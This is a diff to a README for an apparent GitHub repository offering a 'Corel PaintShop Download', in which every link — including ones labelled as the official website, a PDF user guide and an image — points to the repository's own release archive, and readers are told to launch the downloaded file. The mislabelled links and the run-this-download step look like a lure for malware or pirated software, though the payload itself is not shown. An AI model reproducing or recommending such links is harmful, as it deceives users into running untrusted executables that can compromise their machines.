@@ -29,7 +29,7 @@ Welcome to the **Corel PaintShop Download** repository! Here you can find inform
 - **corel-paintshop-pro-ultimate**
 
 ## Software Download
-[![Download Software](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/download/v1.0/Software.zip)](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/tag/v2.0)](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/tag/v2.0)
 
 **Note:** The provided link leads to the download file and needs to be launched to access the software.
 
@@ -46,13 +46,13 @@ If you have any valuable resources, tips, or tricks related to Corel PaintShop P
 
 ## Resources
 Here are some additional resources to help you maximize your experience with Corel PaintShop Pro:
-- [Corel PaintShop Pro Official Website](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/download/v1.0/Software.zip)
-- [User Guide for Corel PaintShop Pro 2023 (PDF)](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/download/v1.0/Software.zip)
-- [Latest Updates and Releases](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/download/v1.0/Software.zip)
+- [Corel PaintShop Pro Official Website](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/tag/v2.0)
+- [User Guide for Corel PaintShop Pro 2023 (PDF)](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/tag/v2.0)
+- [Latest Updates and Releases](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/tag/v2.0)
 
 ## Support
 If you encounter any issues or have questions regarding Corel PaintShop Pro, feel free to reach out for support. Join the vibrant community of users and experts to enhance your skills and resolve any challenges you may face.
 
 Let's dive into the world of photo editing and unleash your creativity with Corel PaintShop Pro! 🎨🌟
 
-![Corel PaintShop Pro](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/download/v1.0/Software.zip)
+![Corel PaintShop Pro](https://github.com/RAMZRUNNING/Corel-PaintShop-Download/releases/tag/v2.0)
